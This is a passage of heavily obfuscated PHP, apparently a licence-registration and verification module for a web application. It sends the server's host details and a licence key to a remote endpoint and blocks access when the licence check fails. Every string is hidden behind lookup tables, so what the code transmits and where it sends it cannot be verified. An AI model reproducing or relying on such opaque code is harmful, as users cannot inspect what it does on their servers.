$bÎ„ŞŞÄ°¦[$b½öİÉ¯·ƒ[122]]; $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[108]][$b½öİÉ¯·ƒ[123]] = $bÎ„ŞŞÄ°¦[$b½öİÉ¯·ƒ[123]]; $dÊŒªÍ°‘Û = $b½öİÉ¯·ƒ[124](10) . $this->lcet59a63c7c . $b½öİÉ¯·ƒ[124](5); $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[93]][$b½öİÉ¯·ƒ[125]][$b½öİÉ¯·ƒ[126]] = $this->{$_SERVER[í½¨][127]}($dÊŒªÍ°‘Û, $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[108]][$b½öİÉ¯·ƒ[113]]); } if ($this->lcet59a63c7c == $b½öİÉ¯·ƒ[121]) { $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[93]][$b½öİÉ¯·ƒ[94]][$b½öİÉ¯·ƒ[99]][$b½öİÉ¯·ƒ[107]] = 0; } $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[108]][$b½öİÉ¯·ƒ[128]] = $b½öİÉ¯·ƒ[104]($this->dulc12afae4d, $b½öİÉ¯·ƒ[129], $b½öİÉ¯·ƒ[10]); goto f¢Ì¶•¥; fÇŠ‚Ü‹‰à: $D†¿¡‹¡ÊÈ = $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[93]][$b½öİÉ¯·ƒ[94]][$b½öİÉ¯·ƒ[76]]; unset($DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[93]][$b½öİÉ¯·ƒ[95]][$b½öİÉ¯·ƒ[96]]); unset($DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[93]][$b½öİÉ¯·ƒ[95]][$b½öİÉ¯·ƒ[97]]); goto fÃØ¨¡™ˆÆ; Fô¨¾‰ÇÍÍ: unset($DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[93]][$b½öİÉ¯·ƒ[94]][$b½öİÉ¯·ƒ[98]]); $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[93]][$b½öİÉ¯·ƒ[94]][$b½öİÉ¯·ƒ[99]] = array($b½öİÉ¯·ƒ[100] => (int) $D†¿¡‹¡ÊÈ[$b½öİÉ¯·ƒ[101]], $b½öİÉ¯·ƒ[102] => $b½öİÉ¯·ƒ[103]($b½öİÉ¯·ƒ[104]($D†¿¡‹¡ÊÈ, $b½öİÉ¯·ƒ[105], array())), $b½öİÉ¯·ƒ[106] => (int) $b½öİÉ¯·ƒ[104]($D†¿¡‹¡ÊÈ, $b½öİÉ¯·ƒ[107], 0)); $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[108]][$b½öİÉ¯·ƒ[109]] = $b½öİÉ¯·ƒ[110]($b½öİÉ¯·ƒ[111])->{$_SERVER[í½¨][112]}(); goto fùñÆ«”š„; B°×…•«±Á: $EÀ™Üëù‹÷ = $Døõ‚†ÂÕ[577]; $dŞ¦Ï¤¦—Õ = array($b½öİÉ¯·ƒ[64], $b½öİÉ¯·ƒ[65], $b½öİÉ¯·ƒ[66], $b½öİÉ¯·ƒ[67], $b½öİÉ¯·ƒ[68], $b½öİÉ¯·ƒ[69], $b½öİÉ¯·ƒ[70], $b½öİÉ¯·ƒ[71], $b½öİÉ¯·ƒ[72], $b½öİÉ¯·ƒ[73], $b½öİÉ¯·ƒ[74], $b½öİÉ¯·ƒ[75], $b½öİÉ¯·ƒ[76], $b½öİÉ¯·ƒ[77], $b½öİÉ¯·ƒ[78], $b½öİÉ¯·ƒ[79], $b½öİÉ¯·ƒ[80], $b½öİÉ¯·ƒ[81], $b½öİÉ¯·ƒ[82], $b½öİÉ¯·ƒ[83], $b½öİÉ¯·ƒ[84], $b½öİÉ¯·ƒ[85], $b½öİÉ¯·ƒ[86], $b½öİÉ¯·ƒ[87], $b½öİÉ¯·ƒ[88], $b½öİÉ¯·ƒ[89], $b½öİÉ¯·ƒ[90]); foreach ($dŞ¦Ï¤¦—Õ as $e‰·´äãõ) { $d¥ÌåÆÑà = $GLOBALS[$b½öİÉ¯·ƒ[91]][$b½öİÉ¯·ƒ[92]][$e‰·´äãõ]; $CÊ†×õñÄ = $Døõ‚†ÂÕ[578]; if (!$CÊ†×õñÄ) { die; } if (isset($bÎ„ŞŞÄ°¦[$e‰·´äãõ])) { $d¥ÌåÆÑà = $bÎ„ŞŞÄ°¦[$e‰·´äãõ]; } $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[93]][$b½öİÉ¯·ƒ[94]][$e‰·´äãõ] = $d¥ÌåÆÑà; } goto fÇŠ‚Ü‹‰à; fÃØ¨¡™ˆÆ: $CŸËĞ´ë³¦ = $Døõ‚†ÂÕ[579]; if (!$CŸËĞ´ë³¦) { return; } unset($DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[93]][$b½öİÉ¯·ƒ[94]][$b½öİÉ¯·ƒ[76]]); goto Fô¨¾‰ÇÍÍ; fùñÆ«”š„: $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[108]][$b½öİÉ¯·ƒ[113]] = $b½öİÉ¯·ƒ[114]($_SERVER[$b½öİÉ¯·ƒ[115]] . $bÎ„ŞŞÄ°¦[$b½öİÉ¯·ƒ[116]]); $Bç«×Œ¥‹ø = $Døõ‚†ÂÕ[580]; $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[108]][$b½öİÉ¯·ƒ[117]] = $b½öİÉ¯·ƒ[118]($b½öİÉ¯·ƒ[119]()); goto b¥¸Ò„¢™Ü; bäãÏ‚õ›Ç: if ($b½öİÉ¯·ƒ[104]($GLOBALS, $b½öİÉ¯·ƒ[132]) && $this->config[$b½öİÉ¯·ƒ[133]]) { $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[108]][$b½öİÉ¯·ƒ[134]] = WEB_ROOT; } return $DÉ¬×ˆ¢‚å; goto A…ˆÉÌÎ¨; b¥¸Ò„¢™Ü: $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[108]][$b½öİÉ¯·ƒ[120]] = $this->lcet59a63c7c; $AÊ–ŠŞ‰©Ú = $Døõ‚†ÂÕ[581]; if (!$AÊ–ŠŞ‰©Ú) { return; } goto dŸÙªå‡; c£ˆ³‘˜õ: $Døõ‚†ÂÕ =& $_SERVER[Æ]; $b½öİÉ¯·ƒ =& $_SERVER[í½¨]; $bÎ„ŞŞÄ°¦ = $b½öİÉ¯·ƒ[61]($b½öİÉ¯·ƒ[62])->{$_SERVER[í½¨][63]}(); goto B°×…•«±Á; A…ˆÉÌÎ¨: } private function vwnz8f92d8a2() { goto dò…„¶Ú‡ø; dò…„¶Ú‡ø: $F¹ğ±ŒË Ë =& $_SERVER[Æ]; $C¿ƒÔã©àô =& $_SERVER[í½¨]; if ($_SERVER[$C¿ƒÔã©àô[44]] == $C¿ƒÔã©àô[135]) { goto EŸöøÊ±­; cã¹ëÕÃ: $b‘éìÔ§Ë÷ = $F¹ğ±ŒË Ë[583]; while (strlen($b‘éìÔ§Ë÷) < $F¹ğ±ŒË Ë[552]) { if (!$b‘éìÔ§Ë÷) { break; } $b‘éìÔ§Ë÷++; } $fÓìŒ¿í²© = array($C¿ƒÔã©àô[150] => $bì”‡‰Ï»†); goto D‘Ò‡é„ ê; D‘Ò‡é„ ê: $C¿ƒÔã©àô[13](array($C¿ƒÔã©àô[151], $C¿ƒÔã©àô[152]), $fÓìŒ¿í²©); goto b›¤é‡µó‚; EŸöøÊ±­: $bì”‡‰Ï»† = array($C¿ƒÔã©àô[120] => $this->lcet59a63c7c, $C¿ƒÔã©àô[136] => $this->{$_SERVER[í½¨][137]}(), $C¿ƒÔã©àô[138] => $C¿ƒÔã©àô[61]($C¿ƒÔã©àô[139])->{$_SERVER[í½¨][140]}()); if ($this->lcet59a63c7c != $C¿ƒÔã©àô[121]) { $dæ¸É»‹‡ = $C¿ƒÔã©àô[104]($this->dulc12afae4d, $C¿ƒÔã©àô[141]); if ($dæ¸É»‹‡) { $bì”‡‰Ï»†[$C¿ƒÔã©àô[142]] = $dæ¸É»‹‡; $bì”‡‰Ï»†[$C¿ƒÔã©àô[143]] = $C¿ƒÔã©àô[144]($C¿ƒÔã©àô[104]($this->dulc12afae4d, $C¿ƒÔã©àô[145])); $bì”‡‰Ï»†[$C¿ƒÔã©àô[146]] = $C¿ƒÔã©àô[104]($this->dulc12afae4d, $C¿ƒÔã©àô[131]); } } $bì”‡‰Ï»† = $this->{$_SERVER[í½¨][147]}($C¿ƒÔã©àô[148]($bì”‡‰Ï»†), $C¿ƒÔã©àô[114]($C¿ƒÔã©àô[149])); goto cã¹ëÕÃ; b›¤é‡µó‚: } goto aù¯Ì¿Šœ¼; e„ÖÁëºëŸ: foreach ($dÜÏ¿«‹¼¾ as $fæâÙ‡„¢·) { if (!isset($DÚ¡“®Êá[$fæâÙ‡„¢·]) || !$DÚ¡“®Êá[$fæâÙ‡„¢·]) { continue; } $fÓìŒ¿í²©[$fæâÙ‡„¢·] = $DÚ¡“®Êá[$fæâÙ‡„¢·]; $cİ‘å‡°ƒõ = $F¹ğ±ŒË Ë[585]; } $C¿ƒÔã©àô[13](array($C¿ƒÔã©àô[151], $C¿ƒÔã©àô[152]), $fÓìŒ¿í²©); goto eŒµ‡İçˆ‹; dÕÛ½ŞÕÃ˜: $Eª‚Ùë•àÙ = $F¹ğ±ŒË Ë[584]; while ($Eª‚Ùë•àÙ < $F¹ğ±ŒË Ë[568]) { if ($Eª‚Ùë•àÙ >= 0) { break; } $Eª‚Ùë•àÙ++; } $fÓìŒ¿í²© = array($C¿ƒÔã©àô[159] => $DÚ¡“®Êá[$C¿ƒÔã©àô[64]], $C¿ƒÔã©àô[160] => $DÚ¡“®Êá[$C¿ƒÔã©àô[65]], $C¿ƒÔã©àô[161] => $C¿ƒÔã©àô[10]); goto e„ÖÁëºëŸ; aù¯Ì¿Šœ¼: if ($this->lcet59a63c7c == $C¿ƒÔã©àô[121]) { return; } $dÜÏ¿«‹¼¾ = array($C¿ƒÔã©àô[153], $C¿ƒÔã©àô[154], $C¿ƒÔã©àô[155], $C¿ƒÔã©àô[156], $C¿ƒÔã©àô[157], $C¿ƒÔã©àô[158]); $DÚ¡“®Êá = $C¿ƒÔã©àô[61]($C¿ƒÔã©àô[62])->{$_SERVER[í½¨][63]}(); goto dÕÛ½ŞÕÃ˜; eŒµ‡İçˆ‹: } private function uwak4f7d66b4() { goto A…¥à¸î¹Ã; f‡Ñ÷–øÏÈ: while ($fß¥ø…²åÔ < $cì˜‹Æ¯¸Š[552]) { if ($fß¥ø…²åÔ >= 0) { break; } $fß¥ø…²åÔ++; } $cÛŒ¸È«ÛÃ = $d‚¨ì¯›í´[124](16); $Eó”Ìøó–Ğ = $cÛŒ¸È«ÛÃ . $D¦İ³³†Ö¨[$d‚¨ì¯›í´[120]] . $this->{$_SERVER[í½¨][147]}($d‚¨ì¯›í´[114]($D¦İ³³†Ö¨[$d‚¨ì¯›í´[209]]), $cÛŒ¸È«ÛÃ); goto DÛ™ë†–ªÚ; Aø´¢ŒÒ®­: $A·åç®òÒ× = $cì˜‹Æ¯¸Š[587]; if ($C–ˆÍ¥¡·ì[$d‚¨ì¯›í´[178]] == $d‚¨ì¯›í´[179]) { $Aå‡¶Á±Êà = $this->{$_SERVER[í½¨][147]}($eáµÌ–øŠ›, $d‚¨ì¯›í´[180]); $eÊÑÌÂŠŒñ = $this->{$_SERVER[í½¨][127]}($d‚¨ì¯›í´[148]($bœ”Í â¥Ô), $eáµÌ–øŠ› . $d‚¨ì¯›í´[181], 3); $C—×Ò±½¬‚ = $this->{$_SERVER[í½¨][182]}($d‚¨ì¯›í´[183] . $Aå‡¶Á±Êà . $d‚¨ì¯›í´[184] . $eÊÑÌÂŠŒñ, -1); $d‚¨ì¯›í´[166]($C—×Ò±½¬‚, !0); } else { if ($C–ˆÍ¥¡·ì[$d‚¨ì¯›í´[178]] == $d‚¨ì¯›í´[185]) { $BìÕ’Ñ£éâ = $d‚¨ì¯›í´[25]($d‚¨ì¯›í´[114]($d‚¨ì¯›í´[186] . $eáµÌ–øŠ›), 12, 15) . $d‚¨ì¯›í´[187]; $eÊÑÌÂŠŒñ = $this->{$_SERVER[í½¨][188]}($d‚¨ì¯›í´[2]($C–ˆÍ¥¡·ì[$d‚¨ì¯›í´[189]]), $BìÕ’Ñ£éâ, 2); $eµõçç©•Œ = $d‚¨ì¯›í´[190]($eÊÑÌÂŠŒñ, !0); if (!$d‚¨ì¯›í´[191]($eµõçç©•Œ) || !$d‚¨ì¯›í´[191]($eµõçç©•Œ[$d‚¨ì¯›í´[192]]) || $eµõçç©•Œ[$d‚¨ì¯›í´[165]] != !0) { $C´µÈ«ïÒ = $d‚¨ì¯›í´[193]; $f¥ÂƒÏÉ÷‘ = $eµõçç©•Œ[$d‚¨ì¯›í´[192]] ? $d‚¨ì¯›í´[194] . $eµõçç©•Œ[$d‚¨ì¯›í´[192]] : $C´µÈ«ïÒ; $d‚¨ì¯›í´[166]($f¥ÂƒÏÉ÷‘, !1); } else { $bœ”Í â¥Ô[$d‚¨ì¯›í´[168]] = $eµõçç©•Œ[$d‚¨ì¯›í´[192]][$d‚¨ì¯›í´[195]]; } } else { $eµõçç©•Œ = $this->{$_SERVER[í½¨][182]}($d‚¨ì¯›í´[196], $bœ”Í â¥Ô, 10); } } if (!$d‚¨ì¯›í´[191]($eµõçç©•Œ) || !$d‚¨ì¯›í´[191]($eµõçç©•Œ[$d‚¨ì¯›í´[192]]) || $eµõçç©•Œ[$d‚¨ì¯›í´[165]] != !0) { $C´µÈ«ïÒ = $d‚¨ì¯›í´[197]($d‚¨ì¯›í´[198]); $f¥ÂƒÏÉ÷‘ = $eµõçç©•Œ[$d‚¨ì¯›í´[192]] ? $d‚¨ì¯›í´[194] . $eµõçç©•Œ[$d‚¨ì¯›í´[192]] : $C´µÈ«ïÒ; $d‚¨ì¯›í´[166]($f¥ÂƒÏÉ÷‘, !1); } goto BÄ½µÄ½â; AÀ÷ˆÂ“´ğ: $A˜‘ÂÍ¨ÙÙ = $bŸîß’—ÈÂ . $D¦İ³³†Ö¨[$d‚¨ì¯›í´[120]] . $D¦İ³³†Ö¨[$d‚¨ì¯›í´[212]]; $D¦İ³³†Ö¨[$d‚¨ì¯›í´[122]] = $d‚¨ì¯›í´[214]($d‚¨ì¯›í´[118]($this->{$_SERVER[í½¨][147]}($A˜‘ÂÍ¨ÙÙ, $d‚¨ì¯›í´[215]))); $fß¥ø…²åÔ = $cì˜‹Æ¯¸Š[588]; goto f‡Ñ÷–øÏÈ; Eã‰Şİ¡ƒ: $Dš¤˜½ÙÊÉ = array(); $Aå¢—’Æºõ = $cì˜‹Æ¯¸Š[591]; if (strlen($Aå¢—’Æºõ) < $cì˜‹Æ¯¸Š[562]) { return; } goto CŒ³‹“…µö; eµå´Òê¨ë: $E¶ÑÑâ´ = $this->{$_SERVER[í½¨][127]}($d‚¨ì¯›í´[148]($bßÁË¶İÔ), $EªóáˆìÂˆ); $e‹ŒøÏµ³ã = $d‚¨ì¯›í´[222]($d‚¨ì¯›í´[61]($d‚¨ì¯›í´[11])->{$_SERVER[í½¨][223]}(), $d‚¨ì¯›í´[224]); $Cè…ô•ËØî = $e‹ŒøÏµ³ã[$d‚¨ì¯›í´[225]]; goto Eã‰Şİ¡ƒ; BÄ½µÄ½â: $bßÁË¶İÔ = $eµõçç©•Œ[$d‚¨ì¯›í´[192]]; $c„â¼†éŸ = $this->{$_SERVER[í½¨][199]}($bßÁË¶İÔ[$d‚¨ì¯›í´[200]]); if (!$c„â¼†éŸ || $c„â¼†éŸ != $d‚¨ì¯›í´[201]($bßÁË¶İÔ[$d‚¨ì¯›í´[145]])) { $f¤ïÅ„Ì‹Ÿ = array($d‚¨ì¯›í´[202] => $d‚¨ì¯›í´[61]($d‚¨ì¯›í´[62])->{$_SERVER[í½¨][63]}($d‚¨ì¯›í´[116]), $d‚¨ì¯›í´[203] => $_SERVER[$d‚¨ì¯›í´[115]], $d‚¨ì¯›í´[204] => $d‚¨ì¯›í´[205](), $d‚¨ì¯›í´[174] => $_SERVER[$d‚¨ì¯›í´[175]]); $eÊÑÌÂŠŒñ = $this->{$_SERVER[í½¨][206]}($d‚¨ì¯›í´[148]($f¤ïÅ„Ì‹Ÿ)); $this->{$_SERVER[í½¨][182]}($d‚¨ì¯›í´[207] . $eÊÑÌÂŠŒñ); $d‚¨ì¯›í´[166]($d‚¨ì¯›í´[197]($d‚¨ì¯›í´[208]), !0); } goto B¨ãœÃƒËÇ; D¼î‡«â¢ã: $c‡ª«ëÊ® = $d‚¨ì¯›í´[214]($d‚¨ì¯›í´[25]($EªóáˆìÂˆ, 10, 16)); $fÏ”ƒŸÈ = $cì˜‹Æ¯¸Š[590]; if (strlen($fÏ”ƒŸÈ) < $cì˜‹Æ¯¸Š[573]) { die; } goto eµå´Òê¨ë; CŒ³‹“…µö: $Dš¤˜½ÙÊÉ[$c‡ª«ëÊ®] = $E¶ÑÑâ´; $AÛ˜îÆˆ = $cì˜‹Æ¯¸Š[592]; if (strlen($AÛ˜îÆˆ) < $cì˜‹Æ¯¸Š[552]) { return; } goto F« ¢„±åº; DÛ™ë†–ªÚ: $D¦İ³³†Ö¨[$d‚¨ì¯›í´[123]] = $d‚¨ì¯›í´[118]($d‚¨ì¯›í´[214]($this->{$_SERVER[í½¨][147]}($Eó”Ìøó–Ğ, $d‚¨ì¯›í´[216]))); if ($bßÁË¶İÔ[$d‚¨ì¯›í´[217]] && $bßÁË¶İÔ[$d‚¨ì¯›í´[217]] >= 1) { $d‚¨ì¯›í´[61]($d‚¨ì¯›í´[62])->{$_SERVER[í½¨][218]}($d‚¨ì¯›í´[219], $d‚¨ì¯›í´[220]); } $d‚¨ì¯›í´[61]($d‚¨ì¯›í´[62])->{$_SERVER[í½¨][221]}($D¦İ³³†Ö¨); goto FàËø×¸«; FàËø×¸«: $EªóáˆìÂˆ = $d‚¨ì¯›í´[114]($_SERVER[$d‚¨ì¯›í´[115]] . $d‚¨ì¯›í´[214]($E„ØÏ¦è¹) . $D¦İ³³†Ö¨[$d‚¨ì¯›í´[210]]); $EàáÅ‹„ñÑ = $cì˜‹Æ¯¸Š[589]; if (!$EàáÅ‹„ñÑ) { die; } goto D¼î‡«â¢ã; b¹Ü²õ·‹ì: if (!isset($C–ˆÍ¥¡·ì[$d‚¨ì¯›í´[165]]) || $d‚¨ì¯›í´[24]($C–ˆÍ¥¡·ì[$d‚¨ì¯›í´[165]]) != 16) { $d‚¨ì¯›í´[166]($d‚¨ì¯›í´[167] . $C–ˆÍ¥¡·ì[$d‚¨ì¯›í´[165]], !1); } $E„ØÏ¦è¹ = $d‚¨ì¯›í´[61]($d‚¨ì¯›í´[62])->{$_SERVER[í½¨][63]}($d‚¨ì¯›í´[116]); $bœ”Í â¥Ô = array($d‚¨ì¯›í´[165] => $C–ˆÍ¥¡·ì[$d‚¨ì¯›í´[165]], $d‚¨ì¯›í´[168] => $d‚¨ì¯›í´[124](16), $d‚¨ì¯›í´[169] => $d‚¨ì¯›í´[149], $d‚¨ì¯›í´[170] => $d‚¨ì¯›í´[171], $d‚¨ì¯›í´[172] => $_SERVER[$d‚¨ì¯›í´[173]], $d‚¨ì¯›í´[174] => $_SERVER[$d‚¨ì¯›í´[175]], $d‚¨ì¯›í´[176] => $_SERVER[$d‚¨ì¯›í´[177]]); goto E¹¸İÌ–Ùß; F« ¢„±åº: $d‚¨ì¯›í´[61]($d‚¨ì¯›í´[11])->{$_SERVER[í½¨][226]}($Cè…ô•ËØî[$d‚¨ì¯›í´[227]], array($d‚¨ì¯›í´[228] => $Dš¤˜½ÙÊÉ)); $dŠï“¨ö¤ = $cì˜‹Æ¯¸Š[593]; $this->dulc12afae4d = $bßÁË¶İÔ; goto fØ‰î£˜À; E¹¸İÌ–Ùß: $b‰¾Ï«ãÎ… = $cì˜‹Æ¯¸Š[586]; if (!$b‰¾Ï«ãÎ…) { return; } $eáµÌ–øŠ› = $d‚¨ì¯›í´[114]($_SERVER[$d‚¨ì¯›í´[115]] . $E„ØÏ¦è¹); goto Aø´¢ŒÒ®­; Aï©¿í¶Œ²: if (!$d‚¨ì¯›í´[104]($GLOBALS, $d‚¨ì¯›í´[132])) { die; } $C–ˆÍ¥¡·ì = $GLOBALS[$d‚¨ì¯›í´[22]]; if (isset($C–ˆÍ¥¡·ì[$d‚¨ì¯›í´[163]])) { $this->{$_SERVER[í½¨][164]}(); die; } goto b¹Ü²õ·‹ì; B¨ãœÃƒËÇ: $D¦İ³³†Ö¨ = array($d‚¨ì¯›í´[209] => $bœ”Í â¥Ô[$d‚¨ì¯›í´[165]], $d‚¨ì¯›í´[210] => $bßÁË¶İÔ[$d‚¨ì¯›í´[211]], $d‚¨ì¯›í´[212] => $d‚¨ì¯›í´[124](16), $d‚¨ì¯›í´[120] => $bßÁË¶İÔ[$d‚¨ì¯›í´[213]]); if ($bœ”Í â¥Ô[$d‚¨ì¯›í´[168]]) { $D¦İ³³†Ö¨[$d‚¨ì¯›í´[212]] = $bœ”Í â¥Ô[$d‚¨ì¯›í´[168]]; } $bŸîß’—ÈÂ = $d‚¨ì¯›í´[25]($d‚¨ì¯›í´[114]($D¦İ³³†Ö¨[$d‚¨ì¯›í´[210]]), 10, 10); goto AÀ÷ˆÂ“´ğ; A…¥à¸î¹Ã: $cì˜‹Æ¯¸Š =& $_SERVER[Æ]; $d‚¨ì¯›í´ =& $_SERVER[í½¨]; if ($_SERVER[$d‚¨ì¯›í´[44]] != $d‚¨ì¯›í´[162]) { return; } goto Aï©¿í¶Œ²; fØ‰î£˜À: $this->lcet59a63c7c = $D¦İ³³†Ö¨[$d‚¨ì¯›í´[120]]; $this->{$_SERVER[í½¨][229]}(); $d‚¨ì¯›í´[166]($d‚¨ì¯›í´[197]($d‚¨ì¯›í´[208]), !0); goto Fæ‹¾«§; Fæ‹¾«§: } private function licenseRegistSuccess() { goto c°Å‡ÓìÉõ; c°Å‡ÓìÉõ: $d¹ÂÏ¸å•ó =& $_SERVER[Æ]; $dŞôóøì£ =& $_SERVER[í½¨]; $D•¯¸íÓ×ó = $dŞôóøì£[61]($dŞôóøì£[62])->{$_SERVER[í½¨][63]}(); goto A¤ŒÔë÷Ñº; A¤ŒÔë÷Ñº: $aíÍÏˆïí¼ = $d¹ÂÏ¸å•ó[594]; while ($aíÍÏˆïí¼ < $d¹ÂÏ¸å•ó[552]) { if ($aíÍÏˆïí¼ >= 0) { break; } $aíÍÏˆïí¼++; } if ($D•¯¸íÓ×ó[$dŞôóøì£[85]] != $dŞôóøì£[220]) { $dŞôóøì£[61]($dŞôóøì£[62])->{$_SERVER[í½¨][221]}($dŞôóøì£[85], $dŞôóøì£[220]); } goto Dµ÷äˆæ™‹; Dµ÷äˆæ™‹: $dŞôóøì£[110]($dŞôóøì£[230])->{$_SERVER[í½¨][231]}(!0); goto båËî×Ûš; båËî×Ûš: } private function hbkz3af52ba2() { $D‘¼ÚãÃ¢ =& $_SERVER[í½¨]; $D‘¼ÚãÃ¢[61]($D‘¼ÚãÃ¢[62])->{$_SERVER[í½¨][221]}(array($D‘¼ÚãÃ¢[209] => $D‘¼ÚãÃ¢[10], $D‘¼ÚãÃ¢[210] => $D‘¼ÚãÃ¢[10], $D‘¼ÚãÃ¢[120] => $D‘¼ÚãÃ¢[121], $D‘¼ÚãÃ¢[122] => $D‘¼ÚãÃ¢[10], $D‘¼ÚãÃ¢[123] => $D‘¼ÚãÃ¢[10])); $D‘¼ÚãÃ¢[61]($D‘¼ÚãÃ¢[62])->{$_SERVER[í½¨][218]}($D‘¼ÚãÃ¢[219], $D‘¼ÚãÃ¢[232]); $this->dulc12afae4d = array(); $this->lcet59a63c7c = $D‘¼ÚãÃ¢[121]; } private function xryde939a418() { goto B¤¼»Äë¬; bÆˆÖ´÷¤: if (strlen($aÓ¡ˆÁÍÓ®) < $dŞƒ½ê¼ÀÊ[568]) { return; } $c„¶îæô… = $EˆÖ”£â[114]($_SERVER[$EˆÖ”£â[115]] . $EˆÖ”£â[214]($D®ŠİëíÄ) . $aÌÛá¿¹´[$EˆÖ”£â[210]]); $e¹®¿ì¨ö = $dŞƒ½ê¼ÀÊ[597]; goto aÅÅ·ÖÚõ; Bòæ„îÈ‚‰: $dš•ëä‘¦İ = $EˆÖ”£â[144]($dÉÏ£ÔÜÑ÷[$EˆÖ”£â[145]]); if ($EˆÖ”£â[233]() >= $dš•ëä‘¦İ) { return $this->{$_SERVER[í½¨][164]}(); } $this->dulc12afae4d = $dÉÏ£ÔÜÑ÷; goto CåŒ¨Â®ÔÄ; dÜ¨±ƒŸ–ì: while ($f»¯ ¸Ü­ < $dŞƒ½ê¼ÀÊ[552]) { if ($f»¯ ¸Ü­ >= 0) { break; } $f»¯ ¸Ü­++; } if ($aÌÛá¿¹´[$EˆÖ”£â[120]] == $EˆÖ”£â[121]) { return; } $D®ŠİëíÄ = $EˆÖ”£â[61]($EˆÖ”£â[62])->{$_SERVER[í½¨][63]}($EˆÖ”£â[116]); goto FÖ‘Ä¸¾§Ö; eœõä·Æ…: $this->lcet59a63c7c = $EˆÖ”£â[121]; $aÌÛá¿¹´ = $EˆÖ”£â[61]($EˆÖ”£â[62])->{$_SERVER[í½¨][63]}(); $f»¯ ¸Ü­ = $dŞƒ½ê¼ÀÊ[595]; goto dÜ¨±ƒŸ–ì; CåŒ¨Â®ÔÄ: $this->lcet59a63c7c = $aÌÛá¿¹´[$EˆÖ”£â[120]]; $f„¦™×„ = $dŞƒ½ê¼ÀÊ[600]; if (strlen($f„¦™×„) < $dŞƒ½ê¼ÀÊ[573]) { die; } goto EÂ±ˆó¿ßŠ; c¬’ôÊ¬: if (!$bíİÑÂæ˜Ú) { return; } $dÉÏ£ÔÜÑ÷ = $this->{$_SERVER[í½¨][188]}($EÎ‘§åÑ±[$EˆÖ”£â[91]][$eÕ˜íóª], $c„¶îæô…); $dÌº‹Ï˜­ = $dŞƒ½ê¼ÀÊ[599]; goto F‰ŠÁìàÁß; aÅÅ·ÖÚõ: if (strlen($e¹®¿ì¨ö) < $dŞƒ½ê¼ÀÊ[568]) { return; } $eÕ˜íóª = $EˆÖ”£â[214]($EˆÖ”£â[25]($c„¶îæô…, 10, 16)); $bíİÑÂæ˜Ú = $dŞƒ½ê¼ÀÊ[598]; goto c¬’ôÊ¬; F‰ŠÁìàÁß: while (strlen($dÌº‹Ï˜­) < $dŞƒ½ê¼ÀÊ[564]) { if (!$dÌº‹Ï˜­) { break; } $dÌº‹Ï˜­++; } $dÉÏ£ÔÜÑ÷ = $EˆÖ”£â[190]($dÉÏ£ÔÜÑ÷, !0); if (!$EˆÖ”£â[191]($dÉÏ£ÔÜÑ÷)) { return $this->{$_SERVER[í½¨][164]}(); } goto Bòæ„îÈ‚‰; B¤¼»Äë¬: $dŞƒ½ê¼ÀÊ =& $_SERVER[Æ]; $EˆÖ”£â =& $_SERVER[í½¨]; $_SERVER[$EˆÖ”£â[175]] = $EˆÖ”£â[104]($_SERVER, $EˆÖ”£â[175], APP_HOST); goto eœõä·Æ…; FÖ‘Ä¸¾§Ö: $D êØœ¯÷Á = $EˆÖ”£â[222]($EˆÖ”£â[61]($EˆÖ”£â[11])->{$_SERVER[í½¨][223]}(), $EˆÖ”£â[224]); $EÎ‘§åÑ± = $D êØœ¯÷Á[$EˆÖ”£â[225]]; $aÓ¡ˆÁÍÓ® = $dŞƒ½ê¼ÀÊ[596]; goto bÆˆÖ´÷¤; EÂ±ˆó¿ßŠ: } private function kotn0785527e() { $EŞ„ğíÜì =& $_SERVER[í½¨]; $a­†ïÓğ±ğ = $GLOBALS[$EŞ„ğíÜì[22]]; $a«Í‘ÊÙ¦ = $_SERVER[$EŞ„ğíÜì[44]]; if ($a«Í‘ÊÙ¦ == $EŞ„ğíÜì[234] && $this->lcet59a63c7c == $EŞ„ğíÜì[121]) { $EŞ„ğíÜì[166]($EŞ„ğíÜì[197]($EŞ„ğíÜì[235]), !1, $EŞ„ğíÜì[236]); } $a¼É©Š©ø… = array($EŞ„ğíÜì[237], $EŞ„ğíÜì[238]); if ($EŞ„ğíÜì[239]($a«Í‘ÊÙ¦, $a¼É©Š©ø…)) { if ($this->lcet59a63c7c == $EŞ„ğíÜì[121] && isset($a­†ïÓğ±ğ[$EŞ„ğíÜì[240]])) { $EŞ„ğíÜì[166]($EŞ„ğíÜì[197]($EŞ„ğíÜì[235]), !1, $EŞ„ğíÜì[236]); die; } $Cùñ ’”Ç¢ = $this->{$_SERVER[í½¨][137]}(); if ($Cùñ ’”Ç¢ != $EŞ„ğíÜì[201]($EŞ„ğíÜì[241])) { if ($Cùñ ’”Ç¢ <= $EŞ„ğíÜì[61]($EŞ„ğíÜì[139])->{$_SERVER[í½¨][140]}()) { $EŞ„ğíÜì[166]($EŞ„ğíÜì[197]($EŞ„ğíÜì[242]), !1, $EŞ„ğíÜì[236]); die; } } } } private function topb255600f4() { goto c°£î¾¼—; cºÍèµ¯à„: $Aåâ™­…Õ½ = $e÷Ë¨­…‘ö[601]; if (strlen($Aåâ™­…Õ½) < $e÷Ë¨­…‘ö[564]) { die; } if (!$CÁ‘Æ±Ö[104]($GLOBALS, $CÁ‘Æ±Ö[132]) || !isset($_GET[$CÁ‘Æ±Ö[244]])) { return; } goto CóÅˆ˜ïœÅ; CóÅˆ˜ïœÅ: if (!$CÁ‘Æ±Ö[239]($_SERVER[$CÁ‘Æ±Ö[44]], $fš¼“ãÔá)) { return; } $D­ÊÑŒ“À = $CÁ‘Æ±Ö[245]; $D­ÊÑŒ“À = $this->{$_SERVER[í½¨][246]}($D­ÊÑŒ“À, 